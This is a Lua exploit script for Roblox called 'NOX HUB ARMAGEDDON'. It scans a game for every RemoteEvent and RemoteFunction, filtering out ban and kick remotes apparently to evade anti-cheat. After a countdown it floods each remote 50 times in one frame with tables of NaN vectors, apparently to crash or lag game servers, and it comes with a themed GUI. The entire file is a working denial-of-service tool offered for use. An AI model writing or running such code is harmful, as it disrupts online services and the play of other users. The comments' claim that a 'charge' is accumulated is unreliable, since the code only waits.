--[[
    🔱 NOX HUB v14.0 [ARMAGEDDON] 🔱
    "Total Accumulation. Synchronized Detonation."
    
    ARMAGEDDON FEATURES:
    - [TOTAL SCAN] : Targets EVERY RemoteEvent found in the game.
    - [10s ACCUMULATION] : Prepares thousands of calls without firing them.
    - [SYNCHRONIZED DETONATION] : Releases EVERYTHING in a single microsecond frame.
    - [PAYLOAD MULTIPLIER] : Each remote hits 50x simultaneously.
]]

-- // CORE SERVICES //
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local TweenService = game:GetService("TweenService")
local LocalPlayer = Players.LocalPlayer

-- // 1. ARMAGEDDON ENGINE //
local Engine = {
    Charging = false,
    Targets = {},
    Payload = nil
}

function Engine:Scan()
    Engine.Targets = {}
    -- WE TAKE EVERYTHING.
    -- Strict filters only for immediate bans, everything else is ammo.
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local n = v.Name:lower()
            -- Only filter words that are 100% "Kick/Ban" triggers
            if not (n:find("ban") or n:find("kick") or n:find("punish")) then
                 table.insert(Engine.Targets, v)
            end
        end
    end
end

function Engine:Detonate(updateCallback)
    if Engine.Charging then return end
    Engine.Charging = true
    
    -- STEP 1: SCAN & PREPARE
    updateCallback(0.1, "SCANNING SECTOR...")
    Engine:Scan()
    updateCallback(0.2, "LOCKED ON " .. #Engine.Targets .. " REMOTES")
    task.wait(1)
    
    -- STEP 2: ACCUMULATE (10s Wait)
    -- We don't just wait, we build the "Kill List" in memory.
    local KillList = {}
    local HeavyData = table.create(500, Vector3.new(0/0, 0/0, 0/0)) -- NaN Vectors
    
    for i = 1, 10 do
        updateCallback(0.2 + (i/10)*0.8, "ACCUMULATING CHARGE... [" .. i .. "s]")
        -- Logic: We are mentally preparing the spam.
        -- In code terms: We are just waiting to unleash hell.
        task.wait(1)
    end
    
    -- STEP 3: DETONATION
    updateCallback(1, "RELEASE.")
    
    -- USE COROUTINES FOR INSTANT EXECUTION
    -- We want all remotes to fire in the SAME FRAME.
    for _, remote in pairs(Engine.Targets) do
        task.spawn(function()
            -- Fire 50 times instantly
            for x = 1, 50 do
                pcall(function()
                    if remote:IsA("RemoteEvent") then
                        remote:FireServer(HeavyData)
                        remote:FireServer("Update", HeavyData)
                    elseif remote:IsA("RemoteFunction") then
                        remote:InvokeServer(HeavyData)
                    end
                end)
            end
        end)
    end
    
    game:GetService("StarterGui"):SetCore("SendNotification", {Title="NOX", Text="ARMAGEDDON RELEASED."})
    Engine.Charging = false
    updateCallback(0, "SYSTEM COOLING DOWN")
end

-- // 2. ARMAGEDDON UI //
local Nox = {}

function Nox:CreateUI()
    for _, v in pairs(CoreGui:GetChildren()) do if v.Name:find("Nox") then v:Destroy() end end
    
    local Screen = Instance.new("ScreenGui")
    Screen.Name = "NoxArmageddon"
    pcall(function() Screen.Parent = CoreGui end)
    
    local Main = Instance.new("Frame", Screen)
    Main.Size = UDim2.new(0, 450, 0, 250)
    Main.Position = UDim2.new(0.5, -225, 0.5, -125)
    Main.BackgroundColor3 = Color3.fromRGB(5, 5, 5)
    Main.BorderSizePixel = 3
    Main.BorderColor3 = Color3.fromRGB(255, 100, 0) -- Fire Orange
    
    -- FIRE EFFECT
    local Fire = Instance.new("ImageLabel", Main)
    Fire.Size = UDim2.new(1, 0, 1, 0)
    Fire.Image = "rbxassetid://2634436868" -- Texture
    Fire.ImageColor3 = Color3.fromRGB(255, 50, 0)
    Fire.ImageTransparency = 0.7
    Fire.BackgroundTransparency = 1
    
    -- HEADER
    local Title = Instance.new("TextLabel", Main)
    Title.Text = "NOX // ARMAGEDDON v14.0"
    Title.Font = Enum.Font.GothamBlack
    Title.TextColor3 = Color3.fromRGB(255, 150, 0)
    Title.TextSize = 22
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.Position = UDim2.new(0, 0, 0, 10)
    Title.BackgroundTransparency = 1
    
    -- COUNTDOWN CIRCLE
    local CircleBg = Instance.new("Frame", Main)
    CircleBg.Size = UDim2.new(0, 100, 0, 100)
    CircleBg.Position = UDim2.new(0.5, -50, 0.3, 0)
    CircleBg.BackgroundColor3 = Color3.fromRGB(20, 10, 0)
    
    local CircleCorner = Instance.new("UICorner", CircleBg)
    CircleCorner.CornerRadius = UDim.new(1, 0)
    
    local ProgressText = Instance.new("TextLabel", CircleBg)
    ProgressText.Size = UDim2.new(1, 0, 1, 0)
    ProgressText.BackgroundTransparency = 1
    ProgressText.Text = "READY"
    ProgressText.TextColor3 = Color3.fromRGB(255, 100, 0)
    ProgressText.Font = Enum.Font.GothamBold
    ProgressText.TextSize = 18
    
    local StatusText = Instance.new("TextLabel", Main)
    StatusText.Text = "TARGETING ALL REMOTES"
    StatusText.Size = UDim2.new(1, 0, 0, 20)
    StatusText.Position = UDim2.new(0, 0, 0.75, 0)
    StatusText.TextColor3 = Color3.fromRGB(150, 150, 150)
    StatusText.Font = Enum.Font.Code
    StatusText.TextSize = 14
    StatusText.BackgroundTransparency = 1
    
    -- BUTTON
    local Btn = Instance.new("TextButton", Main)
    Btn.Size = UDim2.new(0.8, 0, 0, 40)
    Btn.Position = UDim2.new(0.1, 0, 0.85, 0)
    Btn.BackgroundColor3 = Color3.fromRGB(100, 30, 0)
    Btn.Text = "BEGIN ACCUMULATION"
    Btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    Btn.Font = Enum.Font.GothamBlack
    Btn.TextSize = 18
    
    local BtnCorner = Instance.new("UICorner", Btn)
    BtnCorner.CornerRadius = UDim.new(0, 6)
    
    Btn.MouseButton1Click:Connect(function()
        if not Engine.Charging then
            Engine:Detonate(function(progress, status)
                StatusText.Text = status
                if progress > 0 and progress < 1 then
                    ProgressText.Text = math.floor(progress * 100) .. "%"
                    TweenService:Create(CircleBg, TweenInfo.new(0.5), {BackgroundColor3 = Color3.fromRGB(math.floor(progress*255), 0, 0)}):Play()
                elseif progress == 1 then
                    ProgressText.Text = "☠️"
                    -- Shake effect
                    for i=1,10 do
                        Main.Position = UDim2.new(0.5, -225 + math.random(-5,5), 0.5, -125 + math.random(-5,5))
                        wait(0.05)
                    end
                    Main.Position = UDim2.new(0.5, -225, 0.5, -125)
                else
                    ProgressText.Text = "READY"
                    CircleBg.BackgroundColor3 = Color3.fromRGB(20, 10, 0)
                end
            end)
        end
    end)
    
    -- DRAG UI
    local dragging, dragInput, dragStart, startPos
    Main.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 then
            dragging = true; dragStart = input.Position; startPos = Main.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement and dragging then
            local delta = input.Position - dragStart
            Main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
    UserInputService.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end end)
end

Nox:CreateUI()
